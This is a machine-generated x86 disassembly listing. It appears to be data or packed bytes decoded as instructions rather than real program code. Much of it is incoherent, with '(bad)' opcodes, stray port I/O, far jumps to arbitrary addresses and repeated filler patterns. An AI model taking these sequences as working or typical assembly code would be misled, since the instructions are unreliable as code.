  41d747:	xor    DWORD PTR [eax],ebp
  41d749:	data16 and BYTE PTR [esi+edi*1+0x6d],ch
  41d74e:	pop    eax
  41d74f:	push   ecx
  41d750:	add    DWORD PTR [edi],esp
  41d752:	xor    eax,0x1c2ddd3f
  41d757:	jbe    0x41d6fc
  41d759:	add    eax,0x11ad6e22
  41d75e:	sbb    eax,0x361f8d63
  41d763:	jno    0x41d6fc
  41d765:	and    DWORD PTR [edi],ebx
  41d767:	inc    edi
  41d768:	mov    ds:0xa1725144,al
  41d76d:	and    eax,0x5b8d7128
  41d772:	mov    al,0x27
	...
  41d79c:	add    BYTE PTR [eax],al
  41d79e:	push   0xffffffc2
  41d7a0:	mov    edx,0x80ce6f28
  41d7a5:	and    ah,BYTE PTR [eax-0x5c]
  41d7a8:	add    DWORD PTR [ebx],0x3e
  41d7ab:	ror    DWORD PTR [edi+esi*1-0x96f347f],0xf
  41d7b3:	or     DWORD PTR [ebx-0x62a49de1],0x579c5228
  41d7bd:	sbb    edi,DWORD PTR [eax+ecx*8+0x45]
  41d7c1:	sub    bl,BYTE PTR ds:0x1d362dcd
  41d7c7:	mov    eax,0xc71d41e7
  41d7cc:	sbb    al,0x35
  41d7ce:	sbb    eax,0xd2224cd
  41d7d3:	shl    bh,0x3
  41d7d6:	and    edi,DWORD PTR [edi-0x7eb00abc]
  41d7dc:	or     esp,DWORD PTR [eax]
  41d7de:	adc    bl,BYTE PTR [ebx+0x3a]
  41d7e1:	cmp    bl,ah
  41d7e3:	mov    eax,ds:0xade02717
  41d7e8:	adc    esp,DWORD PTR [ecx]
  41d7ea:	in     al,dx
  41d7eb:	mov    ebx,0x5b3e270e
  41d7f0:	or     BYTE PTR [eax],ch
  41d7f2:	sar    BYTE PTR [ebx-0x72f0e509],1
  41d7f8:	mov    ebp,0xe7beda27
  41d7fd:	inc    edx
  41d7fe:	sar    BYTE PTR [esi+0x24ce],cl
	...
  41d82c:	cdq    
  41d82d:	(bad)  
  41d82e:	int3   
  41d82f:	inc    edx
  41d830:	mov    al,ds:0xa121a0b7
  41d835:	(bad)  
  41d836:	shl    BYTE PTR [edx],1
  41d838:	xchg   edx,eax
  41d839:	(bad)
  41d83d:	les    eax,FWORD PTR [eax]
  41d83f:	int    0x3d
  41d841:	pushf  
  41d842:	push   0x54c462c4
  41d847:	xchg   esi,eax
  41d848:	and    bh,BYTE PTR [esi-0x39df5392]
  41d84e:	bound  ecx,QWORD PTR [ebx+ebp*1+0x2d8068cc]
  41d855:	pop    ebx
  41d856:	inc    esi
  41d857:	jnp    0x41d871
  41d859:	mov    esi,0x5b219051
  41d85e:	inc    ecx
  41d85f:	jnp    0x41d879
  41d861:	mov    bh,0x43
  41d863:	jg     0x41d875
  41d865:	(bad)  
  41d866:	arpl   WORD PTR [ebx+0x1d],bx
  41d869:	(bad)  
  41d86a:	arpl   WORD PTR [eax],bp
  41d86c:	inc    edx
  41d86d:	pushf  
  41d86e:	jb     0x41d8bc
  41d870:	cwd    
  41d872:	jb     0x41d8b8
  41d874:	popa   
  41d875:	pop    ebx
  41d876:	inc    ecx
  41d877:	cmp    edx,DWORD PTR [ebp-0x35]
  41d87a:	je     0x41d8a2
  41d87c:	popa   
  41d87d:	(bad)  
  41d87e:	push   ebx
  41d87f:	cmp    bl,BYTE PTR [ecx-0x33]
  41d882:	dec    ecx
  41d883:	inc    esp
  41d884:	push   ebp
  41d885:	pop    ebx
  41d886:	inc    ecx
  41d887:	sbb    edx,DWORD PTR [ebp-0x35]
  41d88a:	je     0x41d8b0
  41d88c:	sub    cl,bl
  41d88e:	ins    DWORD PTR es:[edi],dx
  41d88f:	sbb    eax,DWORD PTR [eax]
	...
  41d8b9:	add    BYTE PTR [esi],dh
  41d8bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8bc:	arpl   WORD PTR [eax],dx
  41d8be:	inc    edx
  41d8bf:	pushf  
  41d8c0:	jb     0x41d8c2
  41d8c2:	sub    al,bh
  41d8c4:	inc    esp
  41d8c5:	add    al,0x13
  41d8c7:	(bad)  
  41d8c8:	jb     0x41d8d0
  41d8ca:	and    eax,0x3df063a4
  41d8cf:	pushf  
  41d8d0:	jb     0x41d8b2
  41d8d2:	or     eax,0x59c452c7
  41d8d7:	mov    esp,0x9a58da5f
  41d8dc:	ins    DWORD PTR es:[edi],dx
  41d8dd:	mov    edi,0x78bc71
  41d8e2:	jecxz  0x41d940
  41d8e4:	push   edx
  41d8e5:	sar    DWORD PTR gs:[ecx+0x72],1
  41d8e9:	je     0x41d89e
  41d8eb:	jnp    0x41d93c
  41d8ed:	gs retf 
  41d8ef:	add    BYTE PTR [eax],0x4f
  41d8f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8f3:	jns    0x41d963
  41d8f5:	push   eax
  41d8f6:	aad    0x7b
  41d8f8:	pop    edi
  41d8f9:	gs aam 0x87
  41d8fc:	push   esp
  41d8fd:	outs   dx,DWORD PTR ds:[esi]
  41d8fe:	mov    esp,0xae006e79
  41d903:	jno    0x41d975
  41d905:	gs push ebp
  41d907:	xchg   DWORD PTR [ebx+0x6e],ebp
  41d90a:	(bad)  
  41d90b:	mov    BYTE PTR [ecx+0x4c],ah
  41d90e:	dec    eax
  41d90f:	and    DWORD PTR [ebx+0x65],0x73
  41d913:	nop
  41d914:	outs   dx,BYTE PTR ds:[esi]
  41d915:	push   ebp
  41d916:	adc    al,0x82
  41d918:	jb     0x41d91a
  41d91a:	pusha  
  41d91b:	xor    BYTE PTR [esp+edx*2+0x0],0x0
	...
  41d948:	push   0x6e6e6174
  41d94d:	jno    0x41d9b5
  41d94f:	outs   dx,DWORD PTR ds:[esi]
  41d950:	push   ebp
  41d951:	jp     0x41d9b0
  41d953:	je     0x41d953
  41d955:	outs   dx,DWORD PTR ds:[esi]
  41d956:	outs   dx,BYTE PTR ds:[esi]
  41d957:	add    BYTE PTR [eax+esi*2+0x6e],dl
  41d95b:	jbe    0x41d98f
  41d95d:	lea    esi,[ebx+edx*2+0x4e]
  41d961:	adc    DWORD PTR [edi+ebp*2+0x34],0xffffff93
  41d966:	jb     0x41d9d1
  41d968:	imul   edi,DWORD PTR [ecx+0x4f],0x963369
  41d96f:	dec    esp
  41d970:	dec    eax
  41d971:	js     0x41d9de
  41d973:	outs   dx,BYTE PTR ds:[esi]
  41d974:	xor    cl,BYTE PTR [ecx+eiz*2+0x4c571672]
  41d97b:	outs   dx,DWORD PTR ds:[esi]
  41d97c:	push   0xf7707175
  41d981:	mov    DWORD PTR [ebp+0x76],esp
  41d984:	sbb    ebx,DWORD PTR ds:0x5317a163
  41d98b:	pop    edi
  41d98c:	xchg   edx,eax
  41d98d:	movaps xmm7,XMMWORD PTR [edi]
  41d990:	add    esp,DWORD PTR ds:0x35158b6a
  41d997:	push   esp
  41d998:	cdq    
  41d999:	sbb    eax,0xf46e6e28
  41d99e:	sbb    esi,DWORD PTR [esi+0x67]
  41d9a1:	fisub  WORD PTR [edi]
  41d9a3:	gs pop ebx
  41d9a5:	cmc    
  41d9a6:	add    BYTE PTR [eax],al
  41d9a8:	pop    ebp
  41d9a9:	hlt    
  41d9aa:	sub    esi,DWORD PTR [eax+0x0]
	...
  41d9d5:	add    BYTE PTR [edx+0x15],ch
  41d9d8:	out    dx,eax
  41d9d9:	sub    eax,0x1cde62
  41d9de:	jge    0x41d9b4
  41d9e0:	sub    al,0x70
  41d9e2:	push   edx
  41d9e3:	out    0x1a,eax
  41d9e5:	jo     0x41da33
  41d9e7:	test   eax,0xa61d6338
  41d9ec:	dec    eax
  41d9ed:	pop    edi
  41d9ee:	sub    ah,BYTE PTR [ebx-0x4bdcbefc]
  41d9f4:	cmp    BYTE PTR [ebp+0x2e],cl
  41d9f7:	lahf   
  41d9f8:	push   ds
  41d9f9:	push   ecx
  41d9fa:	pop    ss
  41d9fb:	xchg   ebp,eax
  41d9fc:	cmp    BYTE PTR [ebx+0x23],ah
  41d9ff:	jne    0x41da39
  41da01:	ins    DWORD PTR es:[edi],dx
  41da02:	or     al,0x97
  41da04:	inc    ebx
  41da05:	add    ch,bh
  41da07:	pop    esi
  41da08:	xor    dh,BYTE PTR [ebx+eax*1+0x60]
  41da0c:	aaa    
  41da0d:	imul   edi,ebp,0x5e
  41da10:	xor    dh,BYTE PTR [edi+edx*8+0x57]
  41da14:	sbb    esp,DWORD PTR [ecx-0x21]
  41da17:	dec    ebp
  41da18:	sub    BYTE PTR [ecx+0x7],dh
  41da1b:	pusha  
  41da1c:	push   ecx
  41da1d:	je     0x41da00
  41da1f:	push   ebx
  41da20:	sub    BYTE PTR [eax],al
  41da22:	std    
  41da23:	push   esi
  41da24:	xor    dh,BYTE PTR [ebp+edi*8+0x5a]
  41da28:	rcr    DWORD PTR [esi],cl
  41da2a:	scas   eax,DWORD PTR es:[edi]
  41da2b:	mov    eax,0xc9a337ba
  41da30:	int3   
  41da31:	add    edi,DWORD PTR [edi-0x37]
  41da34:	shl    BYTE PTR [ebx],1
  41da36:	stos   BYTE PTR es:[edi],al
  41da37:	pushf  
  41da38:	retf   0x34
	...
  41da63:	add    BYTE PTR [ebp+0x7f28b9c4],cl
  41da69:	mov    eax,0xb5a137b9
  41da6e:	shl    BYTE PTR [edx],0x61
  41da71:	(bad)  
  41da72:	mov    WORD PTR [ebx+0x6c],ss
  41da75:	les    edx,FWORD PTR [ebp-0x5d4795dc]
  41da7b:	sub    BYTE PTR [ecx+0x5b],dh
  41da7e:	out    0x20,eax
  41da80:	outs   dx,DWORD PTR ds:[esi]
  41da81:	(bad)  
  41da82:	aad    0x27
  41da84:	push   0xffffffbf
  41da86:	out    0x40,eax
  41da88:	dec    edi
  41da89:	les    ebp,FWORD PTR [esi+0x7e9a5228]
  41da8f:	and    BYTE PTR [esi-0x42],cl
  41da92:	push   ebp
  41da93:	daa    
  41da94:	sub    bh,al
  41da96:	aaa    
  41da97:	and    ebp,DWORD PTR [edx]
  41da99:	ret    
  41da9a:	sub    BYTE PTR [esi+edi*1],al
  41da9d:	retf   
  41da9e:	pop    edx
  41da9f:	cmp    BYTE PTR [ebx],dl
  41daa1:	leave  
  41daa2:	dec    esp
  41daa3:	and    DWORD PTR [eax-0x49],ebp
  41daa6:	dec    ebx
  41daa7:	and    BYTE PTR [esi],bh
  41daa9:	stos   DWORD PTR es:[edi],eax
  41daaa:	sbb    bh,BYTE PTR [eax]
  41daac:	sbb    ecx,ecx
  41daae:	inc    esp
  41daaf:	inc    ecx
  41dab0:	or     al,0xb8
  41dab2:	or     BYTE PTR [eax],bh
  41dab4:	frstor [ebx-0x4415cef3]
  41daba:	add    eax,0xe75add21
  41dabf:	add    edi,DWORD PTR [esi]
  41dac1:	pop    ebx
  41dac2:	out    0x3,eax
  41dac4:	ds pop ebx
  41dac6:	out    0x3,eax
	...
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	ds pop ebx
  41daf4:	add    cl,ch
  41daf6:	cmp    eax,0x3de9005b
  41dafb:	pop    ebx
  41dafc:	add    cl,ch
  41dafe:	cmp    eax,0x3de9005b
  41db03:	pop    ebx
  41db04:	add    cl,ch
  41db06:	cmp    eax,0x3de9005b
  41db0b:	pop    ebx
  41db0c:	add    cl,ch
  41db0e:	cmp    eax,0x3de9005b
  41db13:	pop    ebx
  41db14:	add    cl,ch
  41db16:	cmp    eax,0x3de9005b
  41db1b:	pop    ebx
  41db1c:	add    cl,ch
  41db1e:	cmp    eax,0x3de9005b
  41db23:	pop    ebx
  41db24:	add    cl,ch
  41db26:	cmp    eax,0x3de9005b
  41db2b:	pop    ebx
  41db2c:	add    cl,ch
  41db2e:	cmp    eax,0x3de9005b
  41db33:	pop    ebx
  41db34:	add    cl,ch
  41db36:	cmp    eax,0x3de9005b
  41db3b:	pop    ebx
  41db3c:	add    cl,ch
  41db3e:	cmp    eax,0x3de9005b
  41db43:	pop    ebx
  41db44:	add    cl,ch
  41db46:	cmp    eax,0x3de9005b
  41db4b:	pop    ebx
  41db4c:	add    cl,ch
  41db4e:	cmp    eax,0x3de9005b
  41db53:	pop    ebx
  41db54:	add    cl,ch
	...
  41db7e:	add    BYTE PTR [eax],al
  41db80:	cmp    eax,0x3de9005b
  41db85:	pop    ebx
  41db86:	add    cl,ch
  41db88:	cs ret 
  41db8a:	arpl   WORD PTR ds:0xc7328c1e,cx
  41db90:	and    DWORD PTR [edi-0x5cf11694],edi
  41db96:	inc    ebp
  41db97:	add    BYTE PTR [edx-0x6d],cl
  41db9a:	inc    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	inc    ebx
  41db9d:	and    DWORD PTR [ecx+0x72],0x27
  41dba1:	jp     0x41dc17
  41dba3:	push   0x5716
  41dba8:	daa    
  41dba9:	pop    ecx
  41dbaa:	add    BYTE PTR [ebx],dl
  41dbac:	jecxz  0x41db47
  41dbae:	add    BYTE PTR [eax],ch
  41dbb0:	jecxz  0x41db4b
  41dbb2:	add    BYTE PTR [eax],bh
  41dbb4:	ret    
  41dbb5:	cdq    
  41dbb6:	add    BYTE PTR [esi-0x2d],cl
  41dbb9:	cdq    
  41dbba:	add    BYTE PTR [ebx+eiz*8-0x67],bl
  41dbbe:	add    BYTE PTR [ebx+eiz*8-0x67],ch
  41dbc2:	add    BYTE PTR [ebx+eiz*4-0x67],bh
  41dbc6:	add    BYTE PTR [ecx-0x57ff664d],dl
  41dbcc:	mov    ds:0xa3bc0099,eax
  41dbd1:	cdq    
  41dbd2:	add    ch,dl
  41dbd4:	ret    
  41dbd5:	cdq    
  41dbd6:	add    cl,bh
  41dbd8:	xchg   ebx,eax
  41dbd9:	cdq    
  41dbda:	add    BYTE PTR [esi],dl
  41dbdc:	mov    ds:0xd7000099,al
  41dbe1:	pop    eax
  41dbe2:	add    BYTE PTR [ecx],al
	...
  41dc0c:	add    BYTE PTR [eax],al
  41dc0e:	xlat   BYTE PTR ds:[ebx]
  41dc0f:	pop    eax
  41dc10:	add    BYTE PTR ds:0x4d0058a7,0x1e
  41dc17:	aaa    
  41dc18:	inc    ecx
  41dc19:	outs   dx,DWORD PTR ds:[esi]
  41dc1a:	hlt    
  41dc1b:	mov    DWORD PTR [ecx+0x65],ebp
  41dc1e:	popa   
  41dc1f:	mov    ebp,DWORD PTR [edi+0x0]
  41dc22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc23:	pop    eax
  41dc24:	add    BYTE PTR [eax+0x589d],al
  41dc2a:	push   esi
  41dc2b:	xchg   DWORD PTR [eax+0x44],esi
  41dc2e:	test   BYTE PTR [edx+0x5866005d],0x0
  41dc35:	xor    BYTE PTR [ebx+0x58],0x0
  41dc39:	add    BYTE PTR [esi],bh
  41dc3b:	jbe    0x41dc56
  41dc3d:	popa   
  41dc3e:	fisttp WORD PTR [ebp-0x1f]
  41dc41:	ds into 
  41dc43:	push   ecx
  41dc44:	cmp    eax,0x462ca5f
  41dc49:	dec    DWORD PTR [ecx+0x42]
  41dc4c:	and    DWORD PTR [eax],0x4101423e
  41dc52:	lahf   
  41dc53:	and    DWORD PTR [ecx],ebx
  41dc55:	arpl   WORD PTR [esi],di
  41dc57:	inc    ebx
  41dc58:	add    DWORD PTR [eax],eax
  41dc5a:	mov    esi,0x3e000462
  41dc5f:	add    DWORD PTR [edx],ebx
  41dc61:	ins    DWORD PTR es:[edi],dx
  41dc62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc63:	sub    esp,DWORD PTR [eax]
  41dc65:	jno    0x41dca5
  41dc67:	inc    ebx
  41dc68:	add    DWORD PTR [eax],eax
  41dc6a:	mov    esi,0x3e00045f
  41dc6f:	cli    
  41dc70:	sbb    esi,DWORD PTR [ecx+0x0]
	...
  41dc9b:	add    BYTE PTR [edx-0x1b],dh
  41dc9e:	xor    dh,BYTE PTR [edi+0x3e]
  41dca1:	inc    eax
  41dca2:	add    DWORD PTR [eax],eax
  41dca4:	mov    esi,0x3e00013e
  41dca9:	out    dx,eax
  41dcaa:	sub    esp,DWORD PTR [eax]
  41dcac:	and    ch,0x25
  41dcaf:	jae    0x41dd14
  41dcb1:	xlat   BYTE PTR ds:[ebx]
  41dcb2:	push   ss
  41dcb3:	je     0x41dd02
  41dcb5:	inc    edx
  41dcb6:	add    eax,DWORD PTR [eax]
  41dcb8:	ds ret 0xffe5
  41dcbc:	mov    ecx,0x236d4641
  41dcc1:	lahf   
  41dcc2:	sbb    DWORD PTR [esi+0x5e],ebp
  41dcc5:	xor    DWORD PTR [eax+esi*2],0xfffffffa
  41dcc9:	mov    ds:0x433e5f30,al
  41dcce:	add    DWORD PTR [eax],eax
  41dcd0:	mov    esi,0x3e000454
  41dcd5:	ja     0x41dd02
  41dcd7:	and    dh,ch
  41dcd9:	call   0x2119:0x5af37425
  41dce0:	out    dx,eax
  41dce1:	pop    edx
  41dce2:	jmp    0xc51d1aea
  41dce7:	add    edi,DWORD PTR [esi]
  41dce9:	pop    ebx
  41dcea:	sub    bl,BYTE PTR [ebx]
  41dcec:	in     eax,0xbd
  41dcee:	push   ss
  41dcef:	sbb    bl,BYTE PTR [esi]
  41dcf1:	xchg   edi,eax
  41dcf2:	push   cs
  41dcf3:	daa    
  41dcf4:	int    0xbd
  41dcf6:	or     al,0x1a
  41dcf8:	retf   0xe7c7
  41dcfb:	add    eax,0xda675b3e
	...
  41dd28:	add    BYTE PTR [eax],al
  41dd2a:	xor    DWORD PTR [ebx-0x19],ecx
  41dd2d:	inc    esi
  41dd2e:	fwait
  41dd2f:	mov    eax,0x7b901ac4
  41dd34:	test   al,0x1f
  41dd36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd37:	mov    ah,0xd5
  41dd39:	sbb    al,0x8f
  41dd3b:	iret   
  41dd3c:	mov    ecx,0xbdb49224
  41dd41:	and    BYTE PTR [esi-0x51],bl
  41dd44:	mov    esi,0xe7ce6a1a
  41dd49:	add    al,0x3e
  41dd4b:	pop    ebx
  41dd4c:	addr16 repz jmp 0x5a86c49d
  41dd53:	mov    eax,0xce611980
  41dd58:	jnp    0x41dd8f
  41dd5a:	jno    0x41dd2b
  41dd5c:	nop
  41dd5d:	xor    DWORD PTR [ebp+0x7b],ebx
  41dd60:	fwait
  41dd61:	sbb    dl,BYTE PTR [ebx-0x49]
  41dd64:	jp     0x41dd69
  41dd66:	mov    ecx,0x3d83e74a
  41dd6b:	pop    ebx
  41dd6c:	out    0x3,eax
  41dd6e:	push   cs
  41dd6f:	rcr    BYTE PTR [ecx+0x35],0x13
  41dd73:	mov    ecx,0xae3e1848
  41dd78:	push   esi
  41dd79:	and    cl,BYTE PTR [edx]
  41dd7b:	ror    BYTE PTR [eax+0x36],cl
  41dd7e:	sbb    eax,0x252400a7
  41dd83:	mov    esp,0xb8333e72
  41dd88:	sbb    ax,0xb006
  41dd8c:	sldt   WORD PTR [bx+si]
	...
  41ddb8:	push   ds
  41ddb9:	mov    eax,0x9bf61a75
  41ddbe:	jae    0x41dddb
  41ddc0:	adc    BYTE PTR [esi-0x42100292],bh
  41ddc6:	jb     0x41ddc2
  41ddc8:	and    al,0xb8
  41ddca:	outs   dx,BYTE PTR ds:[esi]
  41ddcb:	adc    eax,0xfd70c301
  41ddd0:	push   esi
  41ddd1:	int    0x63
  41ddd3:	fstp   TBYTE PTR [ecx-0x54]
  41ddd6:	push   0x20b751c4
  41dddb:	scas   eax,DWORD PTR es:[edi]
  41dddc:	inc    esi
  41dddd:	mov    bh,0x64
  41dddf:	les    edx,FWORD PTR [ebx-0x34]
  41dde2:	add    ah,cl
  41dde4:	gs retf 
  41dde6:	ins    BYTE PTR es:[edi],dx
  41dde7:	into   
  41dde8:	push   ebx
  41dde9:	mov    esi,0xc3210772
  41ddee:	arpl   cx,bp
  41ddf0:	xchg   edx,eax
  41ddf1:	jbe    0x41de22
  41ddf3:	aam    0xe0
  41ddf5:	je     0x41de26
  41ddf7:	loope  0x41de36
  41ddf9:	pop    ebx
  41ddfa:	add    cl,ch
  41ddfc:	cmp    eax,0x30a063ac
  41de01:	retf   
  41de02:	arpl   WORD PTR [ebx+0xa],di
  41de05:	mov    eax,0xbe19886e
  41de0a:	push   eax
  41de0b:	jnp    0x41de31
  41de0d:	shl    DWORD PTR [edi+0x7d],1
  41de10:	pop    eax
  41de11:	shl    BYTE PTR [ebx-0x17],0xa
  41de15:	mov    esi,0xab604a54
  41de1a:	jb     0x41de5c
	...
  41de44:	add    BYTE PTR [eax],al
  41de46:	ins    BYTE PTR es:[edi],dx
  41de47:	ret    0x446c
  41de4a:	pop    edi
  41de4b:	mov    esi,0x6a340000
  41de50:	aas    
  41de51:	push   0x656364f6
  41de56:	pop    ecx
  41de57:	fs je  0x41dec3
  41de5a:	add    DWORD PTR [esi+0x50],esi
  41de5d:	jb     0x41dead
  41de5f:	lea    esp,[ebp+0x6c]
  41de62:	inc    edx
  41de63:	jl     0x41dec6
  41de65:	add    BYTE PTR [edx+ebp*2],ah
  41de68:	aas    
  41de69:	jb     0x41dead
  41de6b:	jle    0x41dee1
  41de6d:	xor    esp,DWORD PTR gs:[edi+eiz*2+0x65]
  41de72:	cmp    DWORD PTR [edi+0x64416972],ebp
  41de78:	ins    BYTE PTR es:[edi],dx
  41de79:	gs inc eax
  41de7b:	push   0x9f025300
  41de80:	pop    ebp
  41de81:	arpl   WORD PTR [edx+edi*2],cx
  41de84:	jo     0x41ded6
  41de86:	add    eax,0xdb697666
  41de8b:	imul   esp,DWORD PTR [ebx+0x65],0x5261b027
  41de92:	add    dl,BYTE PTR [eax+0x69c56f74]
  41de98:	push   eax
  41de99:	jb     0x41de99
  41de9b:	mov    ah,BYTE PTR [ebp+0x6c]
  41de9e:	ret    0x617b
  41dea1:	add    BYTE PTR [ecx+ebp*2-0x714b91bb],ah
  41dea8:	popa   
  41dea9:	popa   
	...
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	mov    ah,0x69
  41ded6:	dec    ebp
  41ded7:	jne    0x41de81
  41ded9:	js     0x41df38
  41dedb:	push   eax
  41dedc:	inc    ebp
  41dedd:	gs jbe 0x41df49
  41dee0:	mov    ebx,0xa7656369
  41dee5:	scas   eax,DWORD PTR es:[edi]
  41dee6:	popa   
  41dee7:	inc    ecx
  41dee8:	adc    al,0x8c
  41deea:	gs addr16 stc 
  41deed:	scas   al,BYTE PTR es:[edi]
  41deee:	jb     0x41df59
  41def0:	ds lahf 
  41def2:	and    esi,DWORD PTR [edx+0x17]
  41def5:	mov    ss,WORD PTR ds:0x54b01b69
  41defb:	jb     0x41df14
  41defd:	nop
  41defe:	sbb    ebp,DWORD PTR [ebx+ebx*1-0x67]
  41df02:	pop    ds
  41df03:	add    BYTE PTR [esi],bh
  41df05:	bound  esi,QWORD PTR ds:0xe0120a51
  41df0b:	jo     0x41df2b
  41df0d:	mov    dl,BYTE PTR [eax+0x54]
  41df10:	push   cs
  41df11:	and    esp,esi
  41df13:	sub    eax,0x47f7270e
  41df18:	loope  0x41df5e
  41df1a:	sub    eax,0x321f1e3a
  41df1f:	or     esi,DWORD PTR [ebx+esi*2]
  41df22:	and    DWORD PTR [ecx-0x5d],esp
  41df25:	inc    edx
  41df26:	sub    eax,0xd56c5e3a
  41df2b:	sub    DWORD PTR [ebx],edi
  41df2d:	dec    esp
  41df2e:	inc    esp
  41df2f:	popa   
  41df30:	popf   
  41df31:	pop    ss
  41df32:	xor    DWORD PTR [ebx+ebp*2-0x1],esi
  41df36:	adc    ah,BYTE PTR [ecx+0x0]
	...
  41df61:	add    BYTE PTR [ecx-0x5e91e3ea],ah
  41df67:	pop    esp
  41df68:	in     al,0x66
  41df6a:	call   0x2c0e:0x67741317
  41df71:	sub    al,0x1e
  41df73:	sub    al,0xea
  41df75:	outs   dx,BYTE PTR ds:[esi]
  41df76:	sub    esp,DWORD PTR [edx]
  41df78:	clc    
  41df79:	or     DWORD PTR [ebp-0x1f],edi
  41df7c:	adc    dh,BYTE PTR [ebx+eiz*2-0x38]
  41df80:	sub    eax,0x12d7822b
  41df85:	gs push edx
  41df87:	jmp    0xb2f:0xde1b1fe6
  41df8e:	inc    esp
  41df8f:	cmc    
  41df90:	adc    eax,0x4c5b206e
  41df95:	and    esi,DWORD PTR [edx]
  41df97:	mov    dl,0x4e
  41df99:	push   ss
  41df9a:	fs jnp 0x41dfe7
  41df9d:	sbb    BYTE PTR [ebx],ch
  41df9f:	int3   
  41dfa0:	inc    esp
  41dfa1:	stc    
  41dfa2:	inc    edi
  41dfa3:	pushf  
  41dfa4:	push   esi
  41dfa5:	push   ss
  41dfa6:	adc    bh,BYTE PTR [esi-0x50aacfb3]
  41dfac:	xor    BYTE PTR [ebx*8-0x11daf87c],dh
  41dfb3:	retf   0x1d13
  41dfb6:	fistp  QWORD PTR [ecx-0x472ce2ed]
  41dfbc:	(bad)  
  41dfbd:	push   ss
  41dfbe:	(bad)  
  41dfc0:	add    al,0x30
  41dfc2:	and    eax,0x31fbcc
	...
  41dfef:	add    ch,bl
  41dff1:	mov    ecx,0x9c37f90c
  41dff6:	push   es
  41dff7:	push   ss
  41dff8:	mov    dl,0xc0
  41dffa:	std    
  41dffb:	das    
  41dffc:	mov    al,gs:0xbf9b22d5
  41e002:	rcl    BYTE PTR ds:0x2207819b,1
  41e008:	mov    eax,ds:0x8931c8b5
  41e00d:	pop    eax
  41e00e:	icebp  
  41e00f:	push   eax
  41e010:	pop    eax
  41e012:	mov    ecx,0xccbe40d8
  41e017:	adc    eax,0x39078172
  41e01c:	arpl   cx,ax
  41e01e:	nop
  41e01f:	pop    ss
  41e020:	pop    edx
  41e021:	mov    esp,0x8b13efce
  41e026:	(bad)  
  41e027:	fistp  DWORD PTR [esi-0x4a]
  41e02a:	jl     0x41e05f
  41e02c:	jno    0x41dffd
  41e02e:	nop
  41e02f:	and    DWORD PTR [edx-0x40],ebx
  41e032:	ret    0x74e3
  41e035:	stos   BYTE PTR es:[edi],al
  41e036:	add    BYTE PTR [eax-0x40cc8502],ah
  41e03c:	lods   eax,DWORD PTR ds:[esi]
  41e03d:	and    DWORD PTR [eax],0x3e
  41e040:	inc    ebp
  41e041:	mov    ch,0x64
  41e043:	dec    esi
  41e044:	push   ebx
  41e045:	int3   
  41e046:	and    BYTE PTR [eax],dl
  41e048:	stos   BYTE PTR es:[edi],al
  41e049:	jge    0x41e056
  41e04b:	jecxz  0x41dfd5
  41e04d:	push   esp
  41e04e:	add    BYTE PTR [edx],ch
  41e050:	xor    esi,DWORD PTR [ebp+0x4474]
	...
  41e07e:	sub    bh,cl
  41e080:	sub    esp,DWORD PTR ds:0x3565b559
  41e086:	push   edx
  41e087:	add    DWORD PTR [eax],0x5fbc5335
  41e08d:	adc    eax,0xd36eb845
  41e092:	cmp    eax,0x5a3543a0
  41e097:	jns    0x41e10a
  41e099:	leave  
  41e09a:	add    eax,0x6b1954af
  41e09f:	jne    0x41e0cf
  41e0a1:	mov    ecx,0xfe485430
  41e0a6:	outs   dx,BYTE PTR ds:[esi]
  41e0a7:	iret   
  41e0a8:	cmp    cl,BYTE PTR [ecx]
  41e0aa:	or     ebx,ecx
  41e0ac:	or     esi,ebx
  41e0ae:	jl     0x41e06c
  41e0b0:	popa   
  41e0b1:	int3   
  41e0b2:	dec    ebp
  41e0b3:	iret   
  41e0b4:	cmp    cl,BYTE PTR [ecx]
  41e0b6:	hlt    
  41e0b7:	jbe    0x41e0e3
  41e0b9:	hlt    
  41e0ba:	pop    es
  41e0bb:	test   DWORD PTR [ecx-0x36],esp
  41e0be:	and    bl,cl
  41e0c0:	je     0x41e0c6
  41e0c2:	cmp    DWORD PTR [ebp-0x41ae419f],esi
  41e0c8:	outs   dx,BYTE PTR ds:[esi]
  41e0c9:	mov    ss,edi
  41e0cb:	test   DWORD PTR gs:[bx+si-0x4b],eax
  41e0d0:	je     0x41e052
  41e0d2:	sub    esi,ecx
  41e0d4:	sub    al,0xc9
  41e0d6:	test   DWORD PTR [edx+0x4a02006f],0x6e940a0a
  41e0e0:	outs   dx,BYTE PTR ds:[esi]
  41e0e1:	outs   dx,BYTE PTR ds:[esi]
	...
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	retf   0x747a
  41e10f:	imul   esi,DWORD PTR [eax],0xf4203a70
  41e115:	bound  ebp,QWORD PTR [ebx+0x73]
  41e118:	cli    
  41e119:	dec    ebp
  41e11a:	pop    es
  41e11b:	push   ebp
  41e11c:	hlt    
  41e11d:	gs jb  0x41e14d
  41e120:	pushw  0x6e61
  41e124:	dec    ebx
  41e125:	xor    DWORD PTR ds:0x6570f04d,ebx
  41e12b:	ins    BYTE PTR es:[edi],dx
  41e12c:	add    edi,DWORD PTR [edx+0x2b]
  41e12f:	xor    al,0x71
  41e131:	dec    ecx
  41e132:	sbb    eax,0x69703428
  41e137:	jo     0x41e16f
  41e139:	mov    esp,DWORD PTR [ebp+0x62]
  41e13c:	inc    ebx
  41e13d:	data16 aaa 
  41e13f:	and    BYTE PTR [edx],dh
  41e141:	lods   al,BYTE PTR ds:[esi]
  41e142:	inc    ebp
  41e143:	inc    ebp
  41e144:	ja     0x41e17a
  41e146:	sub    esi,DWORD PTR [eax]
  41e148:	jl     0x41e183
  41e14a:	push   esp
  41e14b:	imul   eax,DWORD PTR [ecx+0x7b],0x3934776b
  41e152:	cmp    BYTE PTR ss:[esi+0x4c],cl
  41e156:	pop    es
  41e157:	or     eax,0x2e592d
  41e15c:	inc    ecx
  41e15d:	sub    eax,0x2d3d5bfd
  41e162:	daa    
  41e163:	add    BYTE PTR ds:0xcf00272d,ch
  41e169:	xchg   edi,eax
  41e16a:	inc    ebp
  41e16b:	inc    esp
  41e16c:	out    0x73,eax
  41e16e:	and    DWORD PTR [eax],esi
	...
  41e198:	add    BYTE PTR [eax],al
